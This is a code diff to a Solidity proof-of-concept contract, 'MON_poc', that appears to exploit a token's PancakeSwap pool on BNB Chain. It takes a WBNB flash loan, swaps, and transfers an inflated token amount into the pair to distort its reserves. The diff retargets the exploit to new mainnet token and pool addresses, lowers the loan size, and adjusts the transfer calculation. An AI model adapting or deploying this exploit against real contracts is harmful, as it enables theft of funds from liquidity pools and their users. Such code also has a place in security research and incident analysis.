@@ -22,12 +22,12 @@ contract MON_poc{
     address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
     address public constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
     address public constant DPPAdvanced = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;               //flashloan wbnb and busd
-    address public constant token = 0x61f7D2039f3b29f9E5020DDf9CcCd47FE9252dFa;
-    address public constant LP_token = 0x3d530A8d86B3be01aac6c2C1848F43B55484C61d;           //swap   (token0: wdoge,   token1: wbnb)
+    address public constant token = 0xB695e75359A4037f592845873878c24B74D4db93;
+    address public constant LP_token = 0x5A29ba90b0358090adE1f07dD952bf4377453131;           //swap   (token0: wdoge,   token1: wbnb)
     
-    address admin ;
+    address admin;
     uint256 constant fee = 2;
-    uint256 Borrow_money_WBNB = 2000 * 10 ** 18;
+    uint256 Borrow_money_WBNB = 30 * 10 ** 18;
     uint256 Borrow_money_BUSD = 0 * 10 ** 18;
 
     // bool WBNB_IS_0 = true;
@@ -96,7 +96,7 @@ contract MON_poc{
         (uint256 r0, uint256 r1,) = UniswapV2Pair(LP_token).getReserves();
         console.log("2xxxxxxxxxxxxx after I swap, the pool remains: ", r0, r1);        //check the pool
 
-        uint256 transfer_amount2 = IERC20(token).balanceOf(LP_token) * 100;                            //transfer coin to pool
+        uint256 transfer_amount2 = IERC20(token).balanceOf(LP_token) * 100/fee;                            //transfer coin to pool
         IERC20(token).transfer(LP_token, transfer_amount2);
         console.log("Transfer MON to pancake pair... I still have", IERC20(token).balanceOf(address(this)));
 
